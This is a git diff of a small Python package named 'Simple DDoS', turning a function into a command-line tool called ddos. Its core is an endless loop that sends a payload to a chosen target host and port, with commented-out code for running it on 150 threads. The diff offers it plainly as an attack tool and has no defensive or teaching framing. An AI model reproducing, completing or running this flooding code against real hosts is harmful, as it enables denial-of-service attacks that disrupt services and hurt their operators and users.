@@ -1,6 +1,14 @@
+"""Top-level package for Simple DDoS."""
+# simple_ddos/py_ddos.py
+
+
 import os
 import platform
 import random
+import ipaddress
+from ipaddress import IPv4Address
+
+import typer
 
 # import threading
 import socket
@@ -47,8 +55,9 @@ def check_os():
 
 # Why use a try
 
-def init_app(target, port, ipaddress):
+def ddos(target: str, port: str, ip: bool = False):
     sent = 0
+    net = socket.getaddrinfo(target, port)
     try:
         while True:
             sock.sendto(bytes1, (target, port))
@@ -78,3 +87,6 @@ def init_app(target, port, ipaddress):
 # for i in range(150):
 #     thread = threading.Thread(target=ddos)
 #     thread.start()
+
+if __name__ == "__main__":
+    typer.run(ddos)
